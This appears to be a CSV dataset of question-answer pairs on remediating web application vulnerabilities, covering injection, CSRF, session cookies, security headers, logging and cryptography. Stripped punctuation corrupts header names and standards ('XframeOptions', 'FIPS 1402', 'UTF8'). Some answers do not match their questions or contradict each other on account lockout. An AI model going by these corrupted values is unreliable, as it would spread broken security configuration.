How to resolve Filename injection Path traversal?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path."
How to resolve XSS injection?,"In order to prevent XSS injections, all userinput should be escaped or encoded. You could start by sanitizing userinput as soon as it is inserted into the application, by preference using a so called whitelisting method. This means you should not check for malicious content like the tags or anything, but only allow the expected input. Every input which is outside of the intended operation of the application should immediately be detected and login rejected. Do not try to help use the input in any way because that could introduce a new type of attack by converting characters. The second step would be encoding all the parameters or userinput before putting this in your html with encoding libraries specially designed for this purpose.You should take into consideration that there are several contexts for encoding userinput for escaping XSS injections. These contexts are amongst others:HTML encoding is for whenever your userinput is displayed directly into your HTML. HTML attribute encoding is the type of encoding/escaping that should be applied whenever your user input is displayed into the attribute of your HTML tags. HTML URL encoding ;This type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.JavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods."
How to resolve Command injection?,Userinput that is used in a shell command should not contain dangerous characters. A blacklist of characters is not a good option because it may be difficult to think of all of the characters to validate against. A white list containing only allowable characters should be created to validate the userinput.
How to resolve Cross site request forgery?,"To arm an application against automated attacks and tooling you need to use unique tokens which are included into the forms of an application, API calls or AJAX requests. Any state changing operation requires a secure random token (e.g CSRF token) to prevent against CSRF attacks. Characteristics of a CSRF Token are a unique, large random value generated by a cryptographically secure random number generator.The CSRF token is then added as a hidden field for forms and validated on the sever side whenever a user is sending a request to the server.Note : Whenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent in the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar."
How to resolve XXE injections?,Disable the possibility to fetch resources from an external source. This is normally done in the configuration of the used XML parser.
How to resolve X Path injections?,"Just like the techniques to avoid SQL injection, you need to use a parameterised XPath interface if one is available, or escape the user input to make it safe to include in a dynamically constructed query. If you are using quotes to terminate untrusted input in a dynamically constructed XPath query, then you need to escape that quote in the untrusted input to ensure the untrusted data can not try to break out of that quoted context."
How to resolve XML injection?,"In addition to the existing input validation, define a positive approach which escapes/encodes characters that can be interpreted as XML. At a minimum this includes the following: < > / "" '"
How to resolve XSLT injections?,To protect against such vulnerability one needs to make sure that he does not use usersupplied input in the XSL filename. The best solution would be to define a list of permitted filenames and only accept XSL filenames from that list.
How to resolve External DTD parsing?,Disable the XML DTD (Document Type Definition) parsing. This can be set when initiating the XML parser.
How to resolve LDAP injection?,"The best way to prevent LDAP injection is to use a positive validation scheme for ensuring that the data going into your queries does not contain any attacks. However, in some cases, it is necessary to include special characters in the input that is passed into an LDAP query. In this case, using escaping can prevent the LDAP interpreter from thinking those special characters are actually part of the LDAP query."
How to resolve SSI injections?,The SSI handler on the webserver should not be activated when it is not used.
How to resolve File upload injections?,"Uploaded files always need to be placed outside the document root of the webserver.You should also check the userinput(filename) for having the right allowed extensions such as .jpg, .png etc.Note: when checking these extensions always make sure your application validates the last possible extension so an attacker could not simply inject "".jpg.php"" and bypass your validationAfter this validation, you must also check the userinput(filename) for containing possible path traversal patterns in order to prevent him from uploading outside of the intended directory.Most developers also do a mimetype check. This is a good protection however not whenever you are checking this mimetype through the post request. This header can not be trusted since it can be easily manipulated by an attacker.The best way to check the mimetype is to extract the file from the server after uploading and check it from the file itself. Deleting it whenever it does not comply with expected values.You may also want to check if the filenames do already exist before uploading in order to prevent the overwriting of files.Also for serving the files back there needs to be a file handler function that can select the file based on an identifier that will serve the file back towards the user."
How to resolve Version management?,"One option is not to use components that you did not write. But that is not very realistic.Most component projects do not create vulnerability patches for old versions. Instead, most simply fix the problem in the next version. So upgrading to these new versions is critical. Software projects should have a process in place to:Identify all components and the versions you are using, including all dependencies. (e.g., the versions plugin).Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.Establish security policies governing components use, such as requiring certain software development practices, passing security tests, and acceptable licenses.Where appropriate, consider adding security wrappers around components to disable unused functionality and/ or secure weak or vulnerable aspects of the component.This also goes for all other components that should be up to date with proper security configuration(s) and version(s) such as server OS etc.This should include removal of unneeded configurations and folders such as sample applications, platform documentation, and default or example users."
How to resolve Verbose error messaging?,The level of debugging information needs to be determined according to the environment where the code is running.
How to resolve Debug enabeling?,Disable the possibility to enable debug information on a live environment.
How to resolve Robots.txt?,Instead of the blacklisting method:Useragent: * Disallow: /squirrelmail/ Disallow: /admin/ Disallow: /modules/You should use a whitelisting method:Useragent: * Disallow: * Allow: /index.html Allow: /home.html
How to resolve Accessible non parsed dynamic scripts?,Always add the different types of extensions to the webserver handler to parse. This way the file source cannot be viewed.
How to resolve Include anti caching headers?,"These headers are also known as the: Cachecontrol: nostore,nocache and provide protection of sensitive information when implemented in the application or webserver.Rightly configured anti caching headers will look like the following as a response Expires: Tue, 03 Jul 2001 06:00:00 GMT LastModified: {now} GMT CacheControl: nostore, nocache, mustrevalidate, maxage=0 CacheControl: postcheck=0, precheck=0 Pragma: nocache"
How to resolve Include anti clickjacking headers?,"To avoid your application from being clickjacked you can add the XframeOptions header to your application. These headers can be configured as: XframeOptions: denyThe page cannot be displayed in a frame, regardless of the site attempting to do so. XFrameOptions: sameorign The page can only be displayed in a frame on the same origin as the page itself. XFrameOptions: ALLOWFROM uriThe page can only be displayed in a frame on the specified origin.You may also want to consider to include ""Framebreaking/Framebusting"" defense for legacy browsers that do not support XFrameOption headers.Source: https://www.codemagi.com/blog/post/194"
How to resolve Include X XSS?,These headers are also known as the: XXSSProtection: 1; mode=block and provide protection against XSS attacks when implemented in the application or webserver.NOTE: This header only protects against some reflected XSS attacks. This is no substitute for normal escaping and input filtering and sanitization.
How to resolve Include X Content Type Options header?,These headers are also known as the: XContentTypeOptions: nosniff; and provide protection against Mime content type attacks when implemented in the application or webserver.
How to resolve Include Strict Transport Security header?,"These headers are also known as the: StrictTransportSecurity: maxage=16070400: includeSubDomains and provide protection against SSL Strip attacks when implemented in the application or web server.When connecting to an HSTS host for the first time, the browser won't know whether or not to use a secure connection, because it has never received an HSTS header from that host. Consequently, an active network attacker could prevent the browser from ever connecting securely (and even worse, the user may never realize something is amiss). To mitigate this attack, you can add your application to a preload list which makes HSTS enforced by default. When a user connects to one of these hosts for the first time, the browser will know that it must use a secure connection. If a network attacker prevents secure connections to the server, the browser will not attempt to connect over an insecure protocol, thus maintaining the user's security.Visit: https://hstspreload.appspot.com/ Here you can find how to add your application to HSTS preload"
How to resolve Sensitive information stored in cookies?,Do not store sensitive information in cookies.
How to resolve Client side state management?,User restrictions should always be imposed by serverside techniques instead of clientside constraints.
How to resolve Too verbose authentication?,"The application should never publish available usernames. When an attacker gains this information he increases his attack vector and reduces the time required to identify accounts.I.e:Imagine a forgot password function where the user enters his username in order for the application to send a new password to his email address, the user enters a correct username and the application responds with:“Email successfully sent to your email address.” When the user enters an incorrect username it says, “Error: user does not exist.”This function would be vulnerable to username enumeration"
How to resolve Brute force password guessing?,"Implement a method that limits the amount of tries with automated tools. Some examples are using a CAPTCHA or a TARPIT(ratelimiting) method.Be aware that a simple limitation on number of tries may be used as a method to perform denialofservice attack and hence to block certain users like system administrator from logging in. A mechanism combines tries limit with challengeresponse test can be used to prevent this risk while providing convenience for actual user login. For example, start to ask user to complete a CAPTCHA or a TARPIT question during login after a certain number of tries is reached."
How to resolve Denial of service by locking out accounts?,The application should not lockout users when they enter false login credentials.
How to resolve Predictable password and or token generation?,"Tokens should contain a high level entropy and randomness to prevent predictable token generation. All random numbers, random file names, random GUIDs, and random must be generated using the cryptographic module's approved random number generator when these random values are intended to be unguessable by an attacker."
How to resolve Unauthorized credential changes?,"When changing user credentials or email address the user must always enter a valid password in order to implement the changes. This is also called reauthentication or stepup / adaptive authentication. Whenever a user ""reauthenticates"" himself the current session ID value should also be refreshed in order to fend oFf so called ""session hijackers"""
How to resolve Double decoding of headers parameters?,Only one webserver should decode/encode the data.
How to resolve Resource identifier injection?,Safe use of resource identifiers can be done by performing authorisation checks if the identifier belongs to the user.
How to resolve Dynamic scripting injection?,Do not use direct userinput in the dynamic scripting function. You should first use an input validation or encoding function on the user submitted data to clean and sanitize the input against malicious intent.
How to resolve Regular expression injection?,"Do not use userinput without escaping in a regular expression ""regex pattern"", Since this could lead to serious security vulnerabilities."
How to resolve Automated spamming via feedback scripts?,This problem could be prevented by implementing CAPTCHA or ratelimiting mechanisms.
How to resolve Session cookies without the Secure flag?,When creating a session cookie which is sent over an encrypted connection you should set the secure flag. The Secure flag should be set during every setcookie. This will instruct the browser to never send the cookie over HTTP. The purpose of this flag is to prevent the accidental exposure of a cookie value if a user follows an HTTP link.
How to resolve Session cookies without the HttpOnly flag?,"The HttpOnly flag should be set to disable malicious script access to the cookie values such as the session ID value. Also, disable unnecessary HTTP request methods such as the TRACE option. Misconfiguration of the HTTP request headers can lead to stealing the session cookie even though HttpOnly protection is in place."
How to resolve External session hijacking?,"As soon as a session is set for an authenticated user, the server should keep track of the IP address in which the user used when he started the session. When the server discovers a change in IP address, for instance when an attacker hijacks an users session. The server then should deny access, destroy the session and redirect the 'hijacker' to the login page."
How to resolve Insecure transmission of session cookies?,"Session cookies that are used to authenticate the user should always be set on a secure connection.In order to achieve this, you should set the ""secure"" flag on your session cookie to make sure your application in any circumstance does not send this cookie over nonHTTPS connections."
How to resolve Unproven cryptographic algorithms?,Never implement your own designed Crypto functions. Verify that cryptographic modules used by the application have been validated against FIPS 1402 or an equivalent standard.
How to resolve Client side authentication?,"Never implement clientside authentication constraints, since these are easily bypassed. When implementing authentication methods always use serverside solutions."
How to resolve Identifier based authorization?,"Whenever you are checking whether a user is restricted to review certain data, the access restrictions should be processed serverside.The userID should be stored inside of a session variable on login and should be used to retrieve user data from the database like : SELECT data from personaldata where userID=:id < session varNow a possible attacker cannot tamper and change the application operation since the identifier for retrieving the data is handled serverside."
How to resolve Principle of complete mediation?,Verify all access controls are implemented properly in order to prevent a user access data/functions which he was not intended to use.
How to resolve Prepared statements and query parameterization?,"The use of prepared statements and parameterized queries is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied."
How to resolve Are all passwords hashedHow to resolve salted and stretched?,"Recommended for password usage are PBKDF functions. PBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a cryptographic key from a password. Because this process is difficult to reverse (similar to a cryptographic hash function) but can also be configured to be slow to compute, key derivation functions are ideally suited for password hashing use cases.Another alternative would be bcrypt. bcrypt is a password hashing function designed by Niels Provos and David Mazières, based on the Blowfish cipher, and presented at USENIX in 1999. Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an adaptive function: over time, the iteration count can be increased to make it slower, so it remains resistant to bruteforce search attacks even with increasing computation power."
How to resolve Sensitive information transmitted by unencrypted methods?,All sensitive information should always be sent by encrypted methods such as HTTPS(TLS) connections.
How to resolve Session information is not stored server side?,Session information should always be stored on the serverside by means of a serverside language.
How to resolve The crossdomain xml should only contains trusted domains?,Always make sure the crossdomain.xml only contains trusted domains.
How to resolve Session ids should be generated with sufficient entropy?,The WebLogic deployment descriptor should specify a session identifier length of at least 128 bits. A shorter session identifier leaves the application open to bruteforce session guessing attacks.
How to resolve User generated session ids should be rejected by the server?,All session IDs not generated by the server should be rejected.
How to resolve The logout functionality should revoke the complete session?,The logout functionality should revoke the complete session whenever a user wants to terminate his session.Each different framework has its own guide to achieve this revocation. It is also recommended for you to make test cases which you follow to ensure session revocation in your application.
How to resolve The login functionality should always generate a new session id?,The login functionality should always generate (and use) a new session ID after a successful login. This is done to prevent an attacker doing a session fixation attack on your users.Some frameworks do not provide the possibility to change the session ID on login such as .net applications. Whenever this problem occurs you could set an extra random cookie on login with a strong token and store this value in a session variable.Now you can compare the cookie value with the session variable in order to prevent session fixation since the authentication does not solely rely on the session ID since the random cookie can not be predicted or fixated by the attacker.
How to resolve Does The application enforce the use of secure passwords?,"Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered."
How to resolve Session IDs do not timeout (idl)?,All user sessions should timeout based on logic serverside in order to decrease an attackers attack vector on the user session.
How to resolve Directory listing?,"Different types of servers require a different type of approach in order to disable directory listing. For instance: Apache uses a .htacces in order to disable directory listing. As for iis7, directory listing is disabled by default."
How to resolve Unnecessary features enabled or installed?,"Make sure all features and software available on the application/server are necessary for application to work proper. If not, uninstall or disable these services."
How to resolve Avoid the use of default and predictable acounts.?,"Verify that all keys and passwords are replaceable, and are generated or replaced after installation time."
How to resolve Security settings in your development frameworks?,Make sure all your security settings in your development framework are set to secure values. This can be checked by using hardening guides.
How to resolve Insecure datastorage?,"Sensitive data in all forms should always be stored by an encrypted manner. We recommend to follow the ""Secure Cryptographic datastorage"" cheatsheet found on OWASP.https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet"
How to resolve Authentication based on the knowledge of a secret URL?,Always implement proper authentication mechanisms that are not using a static authentication URL.
How to resolve Open forward and Open redirects?,Use a whitelisting method for determining where the user should be redirected towards. You could also show a warning when redirecting to potentially untrusted content.If not deemed necessary user supplied input should not be used in redirects and forwards anyways.
How to resolve Incorrect or missing charset?,"Define the charset for all your pages in order to prevent the browser for guessing the content types.This could be done by adding a meta header in the head of your HTML like:For HTML4: ```html <meta httpequiv=""ContentType"" content=""text/html;charset=ISO88591""> ``` For HTML5: ```html <meta charset=""UTF8""> ``` Or simply by setting contenttype headers by your serverside language, C example of a content type header: Response.AppendHeader(""ContentType:text/html"", ""charset=UTF8"");"
How to resolve Extraneous files in document root?,"Extraneous files in document root should be investigated and deleted if it's not necessary for the operation of the application.There are more chances of accessing hidden folders, files and some configuration files to be accessed through document root.For example if you are using some version control system like git or svn. You may have .git, .svn folders and .gitignore files. If you are using IDE project files, you may have .idea hidden folder. Even there are chances of configuration files with common extensions, like config.json, config.yml, config.xml, package.json, .htaccess, README.md files to be present in the document root. Even there are chances of having swap files, backup files to be there in the document root.The How to resolve this problem is to prevent directory listing , remove the hidden folders, files and configuration files. We can even prevent the users from accessing this files with properly configuring the configuration files of the server like .htaccess files."
How to resolve Username enumeration?,All error messages should be generalized in order to prevent username enumeration. Also sometimes you cannot avoid information leaking in functionalities such as a registration page. Here you need to use tarpitting methods to prevent an automated attack by an attacker.
How to resolve HTTP header injection?,When userinput will be used in HTTP headers then the newlines should be escaped in a correct manner. Recommended would be a whitelist of expected input or use a validation method which for example only accepts alphanumeric values. Every detection of input which is out of the intended operation should be rejected.
How to resolve GET POST requests?,"Whenever transmitting sensitive data always do this by means of the POST request or by header. Note: Avoid userinput in your application header, this could lead to vulnerabilities. Also make sure you disable all other HTTP request methods which are unnecessary for your applications operation such as; REST, PUT, TRACE, DELETE, OPTIONS, etc, since allowing these request methods could lead to vulnerabilities and injections."
How to resolve Insecure internal communication?,"Use TLS encrypted data lines for all internal communication channels. Also, your infrastructure should not traverse unencrypted or weakly encrypted links. Because if so, all your data's integrity and confidentiality will be lost."
How to resolve Sensitive information stored alongside the source code?,"Search your source code for comments which contains possible usercredentials. You should also verify that there are no secrets and API keys are included in the source code, or end up within the resulting binary.This also applies to providing information about business logic and other critically sensitive information. Verify that there is no sensitive business logic, secret keys or other proprietary information in client side code."
How to resolve The possible risks to the application must be documented?,Create a section in the documentation of the project that defines the information that will be stored. This makes it easier to make estimations about critical parts of your application which deserve extra attention.
How to resolve Possible attackers of the application must be documented?,"Verify that all authentication decisions can be logged, without storing sensitive session identifiers or passwords. This should include requests with relevant metadata needed for security investigations."
How to resolve Audit logs?,"An audit log should contain the following items: User ID Operation Success/failure of the operation Privileges TimestampDepending on the gravity of the users violation, there should also be a record kept for each user to lock their accounts after a certain number of violations. This should be applied since we can now assume it is an attacker trying to compromise your application.Also when doing audit logs, make sure you always do logging before taking action in case the action is not properly processed or terminated by your application. When using this approach you are always in possession of an complete audit trail."
How to resolve User credentials in audit logs?,"Instead of storing user credentials, you may want to use user ID's in order to identify the user in the log files."
How to resolve Intrusion detecting and reporting?,"Intrusion detecting could be done by means of a:""Positive security model:"" In this model, you create certain regular expressions in order to only make the application pass the socalled ""known good"". Whenever an application detects strange behavior and anomalies, these issues should be reported. Keep in mind whenever the application changes, this whitelist method has to evolve alongside with it. A big con is it could generate a lot of reports and alerts.""Negative security model:"" Create a blacklist with known attacks and malicious input and make the application report on detection of this input. You could also prioritise different malicious input and classify them into different groups.Whatever method you may choose to prefer, you should always ensure error handling logic in security controls denies access by default. With this approach applied, you will have a higher probability that whenever an attacker manages to break your applications intended operation, it will not fail in a way which increases his attack vector."
How to resolve Authentication at a central location?,"Use a central location for authentication. If u want to put extra constraints on the users for accessing critical parts of your application, you have to implement stepup or adaptive authentication mechanisms.Verify that alternative and less secure access paths do not exist."
How to resolve IP adresses in internal HTTP headers?,Never use IP addresses in internal HTTP headers.
How to resolve Authentication enforced by the web sever?,Always make sure your webserver and application are correctly configured to handle authentication. Also the application and webserver should deny access by default should there be an error of any kind.
How to resolve The audit log must include a priority system?,"Whenever the webapplication is writing error messages to the error log, then these need to have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH. These labels can then be used at a later moment in time for easy and quick analysing capabilities of the log files.You should also verify security logging controls, provide the ability to log success and particularly failure events that are identified as securityrelevant."
How to resolve Servers must not be trusted without explicit authentication?,Whenever the webapplication is facing the internet third parties trying to access it should always use a form of authentication in order to gain access.
How to resolve Ensure overall security?,Always ensure full hardened security on all layers of the web application.
How to resolve Re authentication?,"Verify that the changing password functionality includes the old password, the new password, and a password confirmation, as well as a passphrase strength indication to encourage the adoption of strong password phrases. This same principle applies for other operations that are considered critical such as changing an email adress or phone number."
How to resolve No shared knowledge for secret questions?,"Secret questions should never include shared knowledge, predictable or easy guessable values."
How to resolve Disallow the use of old passwords?,Keep a number of password hashes entries greater than the number of times that the change password functionality execution is permitted and validate that the new password hash is not one of those entries.
How to resolve Absolute session time out?,Always ensure that sessions absolute timeout is on the serverside in order to decrease a hackers attack vector.
How to resolve Logout structuring?,Identify all pages that use authentication. Make a list of all pages on your site that use authentication then verify the presence of logout links. Examine each page that uses authentication to make sure it has a logout link in a location that can be found intuitively.
How to resolve Verify that the session id is never disclosed?,Session ID should never be included in places other than the application cookie header.
How to resolve Session Domain cookies?,"Setting www.example.com will mean only the exact domain www.example.com will be matched, while .example.com (wildcard) will also match again any subdomain (forums.example.com, blog.example.com).The use of a wildcard is not recommended at all and should be avoided.There are a lot of different mitigations in order to harden your session management. These mitigations are amongst others the setting of the ""HttpOnly and secure"" flags on your sessions. Follow the ""Sessions pattern"" list to make sure your session management is secure.Recommended knowledge base items: Cross subdomain cookie attacks"
How to resolve Access control failure?,"Security methods like isAuthorized(), isAuthenticated(), and validate() should all return false if there is an exception during processing. If security controls can throw exceptions, they must be very clear about exactly what that condition means."
How to resolve Input rejection?,"Verify that the application actually rejects the user requests whenever malicious input is detected by your application. The base of this process will be checking the application for expected userinput, for example: Whenever the user is filling in a form which contains a checkbox, there are fixed values which your application can expect from the user to return. Whenever this value differs from what the application served the user as possible answers, you can assume the request was corrupted and you reject the request.You must also keep track of the users movements by adding an audit trail as well as a counter for tracking the number of his violations(submitting bad input) in your input validation class. You should enforce a lockout whenever a unreasonable number of violations are detected by your application in order to protect it from attackers."
How to resolve Input validation?,"All input validation and encodingroutines should be implemented on the serverside outside the reach of an attacker. Just as with the input rejection you should make sure that after validating the userinput, whenever the input is bad it actually rejects, sanitizes or formats your userinput into not malicious data.The recommended method for validating user input would be the positive validation method. Whitelist input validation means allowing only input that is explicitly defined as valid, as opposed to blacklist input validation, which filters out known bad input.You must also keep track of the users movements by adding an audit trail as well as a counter for tracking the number of his violations(submitting bad input) in your input validation class. You should enforce a lockout whenever a unreasonable number of violations are detected by your application in order to protect it from attackers."
How to resolve Single input validation controls?,"Verify that a single input validation control is used by the application for each type of data that is accepted. This way your validation controls stay clear, transparent and manageable. This method leaves less room for error."
How to resolve Logging validation failures?,Verify that all input validation failures are logged in order to counter possible attacks in an early stage. Also you want to verify that error handling logic in security controls denies access by default.
How to resolve Logging implemented on the serverside?,Verify that all logging controls are implemented on the serverside.
How to resolve Logging guidelines?,"The logging file should at least contain, a timestamp from a reliable source, severity level of the event, an indication that this is a security relevant event (if mixed with other logs), the identity of the user that caused the event (if there is a user associated with the event), the source IP address of the request associated with the event, whether the event succeeded or failed, and a description of the event. Also verify that log fields from trusted and untrusted sources are distinguishable in log entries, preferably stored in different files so they cannot taint each other whenever log injection occurs.Verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required."
How to resolve Log viewing software code injection?,"You should consider these three controls when supplying information to the log viewing software: • Design: If at all possible, avoid logging data that came from external inputs. • Implementation: Ensure that all log entries are statically created, or if they must record external data that the input is vigorously whitelist checked. • Run time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection."
How to resolve CA certificates?,"It's always a good idea to let multiple CA you trust create a certificate, the best way is that you create yourself the key pair (pub & priv) and let the CA sign it. This way you don't need to 'leak' your priv key and you have backup trusted certificates you can use as a backup when one goes 'bad'."
How to resolve All connections should be TLS?,"Verify that TLS is used for all connections (including both external and backend connections) that are using authentication tokens or that involve sensitive data or functions. This should also be enforced in the application itself wherever possible, for example: Secure flags on cookies, HSTS, certificate pinning etc."
How to resolve Log TLS connection failures?,Verify that backend TLS connection failures are logged.
How to resolve Content type headers?,An example of a content type header would be: ContentType: text/html; charset=UTF8 or: ContentType: application/json;
How to resolve Malicious intent?,"Running your code through a static code analyzer or auditing tools could give you a chance to find malicious pieces of code which could be embedded into the software. Also if the new or adjusted functionality is critical then check manually it in the form of a code review for back doors, Easter eggs, and logic flaws.This should also mean that authorized administrators must have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.Determine also that the business logic of highvalue transactions is not imported from untrusted third party libraries.Note: Studies have shown backdoors written by employees with malicious intend will propably do this within the first half year of their employment. The implementing of back doors has little to do with how happy an employee is with the current employer, it has proven to be a trait of character rather than a trait of discontent."
How to resolve Sandboxing?,"Examples of sandbox implementations include the following: A jail: networkaccess restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting. Rulebased execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels to users or programs according to a set of determined rules. It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities of infecting a computer. The SELinux and AppArmor security frameworks are two such implementations for Linux. Virtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware. The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator. Sandboxing on native hosts: Security researchers rely heavily on sandboxing technologies to analyze malware behavior By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology. Capability systems can be thought of as a finegrained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capabilitybased implementations can work at various levels, from kernel to userspace. An example of capabilitybased userlevel sandboxing involves HTML rendering in a Web browser. Secure Computing Mode (seccomp) is a sandbox built in the Linux kernel. When activated, seccomp only allows the write(), read(), exit(), and sigreturn() system calls. HTML5 has a ""sandbox"" attribute for use with iframes. Java virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet. The .NET Common Language Runtime provides Code Access Security to enforce restrictions on a untrusted code.```"
How to resolve Repudiation attack?,This type of data should always be processed out of reach of the user and should be verified and enforced serverside.
How to resolve Server side validation?,"All validation of input should be handled on the server side. Whenever the validation is handled on the server side, the validation logic is outside of the scope of the attacker and he can not influence the results.Note: Validation of input should never be done with a blacklisting aproach since attackers can be very nifty in bypassing these type of constraints. Always perform white list validation checks preferably in combination on type checking. i.e if the application expects the value to be an integer, do not make the application accept a value of a string. This input should be logged and rejected."
How to resolve Privilege escalation?,"Checking if a user has enough authorization to execute certain request should always be enforced on the serverside. Also, you may apply the Principle of Least privilege, the principle of least privilege recommends that accounts have the least amount of privilege required to perform their business processes. This encompasses user rights, resource permissions such as CPU limits, memory, network, and file system permissions. For example, if a user only requires access to the network, read access to a database table, and the ability to write to a log, this describes all the permissions that should be granted. Under no circumstances should the user be granted administrative privileges."
How to resolve Enforce sequential step order?,"In order to verify that this stage was run through by a sincere user you want to enforce the application to only process business logic flows in sequential step order, with all steps being processed in realistic human time, and not process out of order, skipped steps, processed steps from another user, or too quickly submitted transactions."
How to resolve Step up or adaptive authentication?,Verify the application has additional authorization (such as step up or adaptive authentication) so the user is challenged before being granted access to sensitive information. This rule also applies for making critical changes to an account or action. Segregation of duties should be applied for highvalue applications to enforce antifraud controls as per the risk of application and past fraud.
How to resolve Cross origin resource sharing?,"CrossOrigin requests have an Origin header, that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use a web browser and a server to determine whether a crossorigin request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this process, that are supported by all major browsers: Origin AccessControlRequestMethod AccessControlRequestHeaders AccessControlAllowOrigin AccessControlAllowCredentials AccessControlAllowMethods AccessControlAllowHeadersThings you must consider when using CORS1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs.2. Ensure that URLs responding with AccessControlAllowOrigin: * do not include any sensitive content or information that might aid an attacker in further attacks. Use the AccessControlAllowOrigin header only on chosen URLs that need to be accessed crossdomain. Don't use the header for the whole domain.3. Allow only selected, trusted domains in the AccessControlAllowOrigin header. Prefer whitelisting domains over blacklisting or allowing any domain (do not use * wildcard nor blindly return the Origin header content without any checks)4. Keep in mind that CORS does not prevent the requested data from going to an unauthenticated location. It's still important for the server to perform usual CSRF prevention.5. While the RFC recommends a preflight request with the OPTIONS verb, current implementations might not perform this request, so it's important that ""ordinary"" (GET and POST) requests perform any access control necessary.6. Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs.7. Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Applicationlevel protocols should be used to protect sensitive data.**NOTE:** Modern application frameworks do dynamically allocation of the origin header, resulting in the browser also allowing to send the ""AccessControlAllowCredentials: true"" header as well in requests. Whenever JSON web tokens are being send in cookies rather than headers, potential attackers could abuse this behaviour to make unauthenticated XHR get requests on the authenticated users behalf to read sensitive information from the pages."
How to resolve Prevent password pre filling?,"Verify that forms containing credentials are not filled in by the application. Prefilling by the application implies that credentials are stored in plaintext or a reversible format, which is explicitly prohibited. Passwords should be stored by preferably PBKDF functions.PBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a cryptographic key from a password. Because this process is difficult to reverse (similar to a cryptographic hash function) but can also be configured to be slow to compute, key derivation functions are ideally suited for password hashing use cases.Examples of good ways to store passwords are with, BCRYPT, Blowfish or in some cases SCRYPT which is a little harder to implement correctlyNOTE: Password prefilling also happens when using the browsers password manager. However this process is different fromt he context described above since the description above implies an application that prefilles credentials from the database/localstorage/etc."
How to resolve All authentication controls must fail securely?,Make sure all the access control systems are thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose.
How to resolve Forget password functions?,"The recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This method is an example of a hashbased message authentication code (HMAC). It combines a secret key with the current timestamp using a cryptographic hash function to generate a onetime password. Because network latency and outofsync clocks can result in the password recipient having to try a range of possible times to authenticate against, the timestamp typically increases in 30second intervals, which thus cuts the potential search space.Or the other option is to use a Mathematicalalgorithmbased onetime password method. This other type of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate a series of onetime passwords from a secret shared key. Each password cannot be guessed even when previous passwords are known. The open source OAuth algorithm is standardized; other algorithms are covered by U.S. patents. Each password is observably unpredictable and independent on previous ones. Therefore, an adversary would be unable to guess what the next password may be, even with the knowledge of all previous passwords.Example of a hard token mathimatical algorithm would be a yubikey Example of a soft token TOTP would be google authenticatorThe last resort would be to send a new password by email. This mail should contain a reset link with a token which is valid for a limited amount of time. Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over. Also, make sure whenever such a recovery cycle is started, the application does not reveal the user’s current password in any way."
How to resolve Aggregate access control protection?,The system should contain a counter which can keep up with the number of times a certain users addresses database tables and should be rejected when he passes a reasonable number. This violation should also be reported since it could indicate an attacker scraping your table contents and stealing company information.
How to resolve Canonicalized user input?,All userinput should be validated whenever the userinput string is complete and is being processed by your application.
How to resolve Approved random number generator?,"All random numbers, random file names, random GUIDs, and random must be generated using the cryptographic module's approved random number generator when these random values are intended to be unguessable/unpredictable by an attacker."
How to resolve Validated cryptographic modules?,Verify that cryptographic modules used by the application have been validated against FIPS 1402 or an equivalent standard.
How to resolve Policy for managing cryptographic keys?,"Verify that there is an explicit policy for how cryptographic keys are managed (e.g., generated, distributed, revoked, expired). Verify that this policy is properly enforced."
How to resolve HTTPS and weakly or unencrypted links?,Verify that credentials or other sensitive information is transported via TLS.
How to resolve Error handling on trusted devices?,Verify that all error handling is performed on trusted devices.
How to resolve Single application level logging?,Verify that there is a single applicationlevel logging implementation that is used by the software.
How to resolve Aggregate user requests?,"Verify the application has the ability to detect and alert on abnormal numbers of requests for information or processing highvalue transactions for that user role, automated use of web service extraction, or data loss prevention. For example, the average user should not be able to access more than 5 records per hour or 30 records per day or add 10 friends to a social network per minute."
